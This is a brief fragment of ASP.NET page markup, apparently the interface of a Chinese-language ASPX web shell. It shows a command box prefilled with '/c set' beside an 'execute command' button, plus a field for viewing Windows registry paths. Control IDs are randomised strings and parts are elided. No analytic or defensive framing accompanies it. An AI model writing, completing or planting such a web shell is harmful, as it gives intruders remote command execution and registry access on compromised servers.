...
<div runat="server" id="vIac">
 ...
 语句:<br/>
 <input class="input" runat="server" id="bkcm" value="/c set" type="text" size="100"/> <asp:Button ID="YrqL" CssClass="bt" runat="server" Text="#执行命令#" OnClick="FbhN"/>
...
<p>注册表路径 : <asp:TextBox id="qPdI" style="width:85%;margin:0 8px;" CssClass="input" runat="server"/><asp:Button ID="MoNA" runat="server" Text="#查看#" CssClass="bt" onclick="RAFL"/></p>
<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
